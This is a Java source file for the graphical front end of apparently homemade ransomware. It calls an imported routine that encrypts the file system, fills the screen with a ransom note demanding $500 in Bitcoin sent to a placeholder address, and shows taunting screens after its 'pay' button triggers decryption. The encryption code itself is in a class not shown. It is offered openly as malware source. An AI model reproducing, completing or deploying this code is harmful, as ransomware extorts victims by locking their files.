package Agent.ransomGUI;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

import Agent.Attack.AttackVector;
import Agent.exceptions.AttackVectorException;
import Agent.exceptions.RansomwareException;

public class RansomGUI extends JFrame implements ActionListener {

	private static final long serialVersionUID = -486811144121647925L;
	private JPanel panel;
	private JLabel label;
	private JButton paidButton;
	private AttackVector ransomProcess;

	public RansomGUI() {
		label = new JLabel();
		panel = new JPanel();
		panel.setVisible(true);
		panel.setBackground(Color.BLACK);
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		this.add(panel);
		this.setSize(screenSize.width, screenSize.height);
		this.setVisible(true);
		ransomProcess = new AttackVector();
	}

	public void start() throws RansomwareException {

		try {
			ransomProcess.encryptFileSystem();
			encryptionScreen();
		} catch (AttackVectorException e) {
			throw new RansomwareException("Process failed", e);
		}
	}

	private void encryptionScreen() {

		paidButton = new JButton("pay");
		label.setText("<html><body dir=\"ltr\">\r\n" + "	<h1 align=\"center\">\r\n"
				+ "		<font size=\"20\" color=\"red\" face=\"Showcard Gothic\">oops, your\r\n"
				+ "			files have been encrypted !</font>\r\n" + "	</h1>\r\n" + "	<h2 align=\"center\">\r\n"
				+ "		<font face=\"Segoe UI Light\" color=\"red\">what happened to my\r\n"
				+ "			computer? </font>\r\n" + "	</h2>\r\n" + "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" color=\"white\"> your important files are\r\n"
				+ "			encrypted. <br /> Many of you documents and other files are no\r\n"
				+ "			longer accessible.<br /> Maybe you are busy looking for a way to\r\n"
				+ "			recover your files , but do not waste your time <br /> Nobody can\r\n"
				+ "			recover your files without our decryption service.\r\n" + "		</font>\r\n"
				+ "	</p>\r\n" + "\r\n" + "	<h2 align=\"center\">\r\n"
				+ "		<font size=\"6\" color=\"red\" face=\"Segoe UI Light\">can i recover\r\n"
				+ "			my files?</font>\r\n" + "	</h2>\r\n" + "\r\n" + "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" color=\"white\"> Sure, we promise you can recover\r\n"
				+ "			all of your important files safely and easily. <br /> All you need\r\n"
				+ "			to do, is pay us 500$ worth of Bitcoin.\r\n" + "		</font>\r\n" + "	</p>\r\n"
				+ "\r\n" + "	<h4 align=\"center\">\r\n"
				+ "		<font size=\"6\" color=\"red\" face=\"Segoe UI Light\">how do i pay?</font>\r\n"
				+ "	</h4>\r\n" + "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" color=\"white\"> Payment is accepted in Bitcoin\r\n"
				+ "			only <br /> send the correct amount to the address specified below.\r\n"
				+ "			<br /> Once your payment is checked, your files will be decrypted\r\n"
				+ "			immediatly\r\n" + "		</font>\r\n" + "	</p>\r\n"
				+ "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" face=\"Segoe UI Light\" color=\"white\"> send 500$\r\n"
				+ "			worth of Bitcoin to this adress: <br /> 1sf5hh454e5eyxvfdv\r\n" + "		</font>\r\n"
				+ "	</p>\r\n" + "\r\n" + "	<form\r\n \n\n</html>");
		panel.add(label);
		panel.add(paidButton, BorderLayout.PAGE_END);
		paidButton.addActionListener(this);
	}

	private void waitScreen() {

		panel.remove(paidButton);
		label.setText("<html><body bgcolor=\"black\" dir=\"ltr\" >\r\n"
				+ "<h1 align=\"center\" ><font size=\"12\" color=\"red\" face=\"Showcard Gothic\">Loading... </font></h1>\r\n"
				+ "<br />\r\n" + "<p align=\"center\">\r\n" +

				"</p>\r\n" + "</body>\r\n" + "</html>");
		panel.add(label);
	}

	private void decryptionScreen() {

		label.setText("<html> <body bgcolor=\"black\" dir=\"ltr\">\r\n" + "\r\n"
				+ "<h1 align=\"center\" ><font size=\"20\" color=\"red\" face=\"Showcard Gothic\">AS WE PROMISED ,<br /> YOUR FILES ARE NOW DECRYPTED !</font></h1>\r\n"
				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
				+ "<h6 align=\"LEFT\" ><font size=\"0.2\" color=\"red\" face=\"verdana\">have fun....for now..</font></h6>\r\n"
				+ "</body>\r\n </html>");
		panel.add(label);
	}

	private void didntPaidScreen() {

		label.setText("<html> <body bgcolor=\"black\" dir=\"ltr\">\r\n" + "\r\n"
				+ "<h1 align=\"center\" ><font size=\"20\" color=\"red\" face=\"Showcard Gothic\">YOU DID NOT PAY US ,<br />now pay, or buy a new computer :) !</font></h1>\r\n"
				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n" + "</body>\r\n </html>");
		panel.add(label);
	}

	@Override
	public void actionPerformed(ActionEvent ex) {
		panel.remove(paidButton);
		waitScreen();

		try {
			ransomProcess.decryptFileSystem();
			decryptionScreen();

		} catch (AttackVectorException e) {
			didntPaidScreen();
		}

	}
}
